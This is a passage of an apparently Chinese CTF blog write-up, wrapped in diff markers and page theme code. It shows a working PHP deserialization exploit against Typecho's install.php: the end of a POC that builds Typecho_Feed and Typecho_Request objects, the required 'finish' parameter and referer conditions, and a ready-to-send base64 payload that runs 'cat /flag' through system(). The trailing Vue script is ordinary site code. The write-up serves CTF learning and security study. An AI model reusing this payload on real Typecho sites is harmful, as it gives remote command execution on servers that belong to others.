+				<span style="color:#e6db74">&#34;category&#34;</span><span style="color:#f92672">=&gt;</span><span style="color:#66d9ef">array</span>(<span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Typecho_Request</span>()),   <span style="color:#75715e">#注意点
+</span><span style="color:#75715e"></span>			)
+		);
+		$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">_type</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;RSS 2.0&#34;</span>;
+	}
+}
+
+$config <span style="color:#f92672">=</span>  <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#34;adapter&#34;</span><span style="color:#f92672">=&gt;</span><span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Typecho_Feed</span>());
+<span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">base64_encode</span>(<span style="color:#a6e22e">serialize</span>(($config)))<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+</code></pre></div><h2 id="43-注意事项">4.3 注意事项</h2>
+<p>需要注意的是：</p>
+<p>在<code>install.php</code>文件中，有对<code>GET</code>请求的参数做要求，<strong>必须为<code>finish</code></strong>：</p>
+<p><img src="https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200710224502.png" alt=""></p>
+<p>以及对请求头中<code>referer</code>的来源做要求，<strong>必须为当前站点</strong>：</p>
+<p><img src="https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200710224858.png" alt=""></p>
+<p>然后我们将上述<code>POC</code>生成的字符串，经过<code>base64</code>加密后，赋值给<code>__typecho_config</code>发送<code>post</code>请求：</p>
+<p>生成字符串如下：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">YToxOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6NTp7czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6OToiY2F0IC9mbGFnIjt9czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfZmlsdGVyIjthOjE6e2k6MDtzOjY6InN5c3RlbSI7fX1zOjQ6ImxpbmsiO3M6NDoibGluayI7czo1OiJ0aXRsZSI7czo1OiJ0aXRsZSI7czo0OiJkYXRlIjtzOjQ6ImRhdGUiO3M6ODoiY2F0ZWdvcnkiO2E6MTp7aTowO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6OToiY2F0IC9mbGFnIjt9czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfZmlsdGVyIjthOjE6e2k6MDtzOjY6InN5c3RlbSI7fX19fX1zOjE5OiIAVHlwZWNob19GZWVkAF90eXBlIjtzOjc6IlJTUyAyLjAiO319
+</code></pre></div><p>发送请求：</p>
+<p><img src="https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200710225614.png" alt=""></p>
+<p>得到<code>flag</code>，当然在这之前构造了很多<code>payload</code>用来查询<code>flag</code>在哪里。</p>
+<p><img src="https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200710225840.png" alt=""></p>
+<blockquote>
+<p>flag{flag_1s_here}</p>
+</blockquote>
+
+                    
+                </div>
+            </div>
+            
+            
+            <nav class="post-pagination">
+
+                
+                <a class="newer-posts" href="https://b40du.github.io/about/">
+			Next<br>About
+                </a>
+                
+                
+                
+                <a class="older-posts">
+			Previous<br>No older posts.
+                </a>
+                
+            </nav>
+            <div class="post-comment-wrapper">
+                
+
+
+
+
+
+
+
+            </div>
+        </div>
+    </div>
+</div>
+
+            </div><div id="single-column-footer">
+Hugo Theme <a href="https://github.com/amazingrise/hugo-theme-diary">Diary</a> by <a href="https://amazingrise.net">Rise</a>
+<br>
+Ported from <a href="https://mak1t0.cc/" target="_blank" rel="noreferrer noopener">Makito</a>'s <a href="https://github.com/SumiMakito/hexo-theme-journal/" target="_blank" rel="noreferrer noopener">Journal.</a> <br>
+<br>
+
+&copy;
+	
+	This is a customized copyright.
+	
+</div>
+            </div>
+    <script>
+let app;
+
+app = new Vue({
+    el: '#app',
+    data: {
+        scrollY: 0,
+        navOpacity: 0,
+        isDrawerOpen: false,
+        mounted: false,
+        isDarkMode: false
+    },
+    methods: {
+            sgn(t, x) {
+                let k = 1. / (1. - 2 * t);
+                if (x <= t) return 0;
+                else if (x >= 1 - t) return 1;
+                else {
+                    return k * (x - t);
+                }
+            },
+            handleScroll() {
+                this.scrollY = window.scrollY;
+                this.navOpacity = this.sgn(.0, Math.min(1, Math.max(0, window.scrollY / (this.pageHeadHeight() - this.navBarHeight() * 0.8))));
+                const {navBar, navBackground, navTitle, extraContainer, streamContainer} = this.$refs;
+
+                if (this.navOpacity >= 1) {
+                    navBackground.style.opacity = 1;
+                    navTitle.style.opacity = 1;
+                } else {
+                    navBackground.style.opacity = 0;
+                    navTitle.style.opacity = 0;
+                }
+            },
+            handleResize() {
+                const {navBar, navBackground, navTitle, extraContainer, streamContainer} = this.$refs;
+                extraContainer.style.left = (streamContainer.offsetWidth - extraContainer.offsetWidth) + 'px';
+            },
+            navBarHeight() {
+                return this.$refs.navBar.offsetHeight;
+            },
+            pageHeadHeight() {
+                return this.$refs.pageHead.offsetHeight;
+            },
+            toggleDrawer() {
+                this.isDrawerOpen = !this.isDrawerOpen;
+                document.getElementsByTagName('html')[0].style.overflow = this.isDrawerOpen ? 'hidden' : 'unset';
+            },
+            closeDrawer() {
+                this.isDrawerOpen = false;
+                document.getElementsByTagName('html')[0].style.overflow = this.isDrawerOpen ? 'hidden' : 'unset';
+            },
+            toggleDarkMode() {
+                this.isDarkMode = !this.isDarkMode;
+                if (this.isDarkMode==true){
+                    document.cookie = "night=1;path=/";
+                    document.body.classList.add("night");
+                } else {
+                    document.cookie = "night=0;path=/";
+                    document.body.classList.remove("night");
+                }
+            }
+    },
+    created() {
+        window.addEventListener('scroll', this.handleScroll);
+        window.addEventListener('resize', this.handleResize);
+        window._nonDesktop = function () {
+            let check = false;
+            (function (a) {
+                if (/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino|android|ipad|playbook|silk/i.test(a) || /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(a.substr(0, 4))) check = true;
+            })(navigator.userAgent || navigator.vendor || window.opera);
+            return check;
+        };
+        
+        var night = document.cookie.replace(/(?:(?:^|.*;\s*)night\s*\=\s*([^;]*).*$)|^.*$/, "$1");
+        if (night==""){
+            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                
+            }
+        }else{
+            
+            if (night=="1") {
+                this.toggleDarkMode();
+            }
+        }
+    },
+    mounted() {
+        this.handleScroll();
+        this.handleResize();
+        this.mounted = true;
+
+        
+    },
+    destroyed() {
+        window.removeEventListener('scroll', this.handleScroll);
+        window.removeEventListener('resize', this.handleResize);
+    }
+});
+</script>
+
+<script src="https://b40du.github.io/js/journal.js"></script>
+    </body>
+</html>
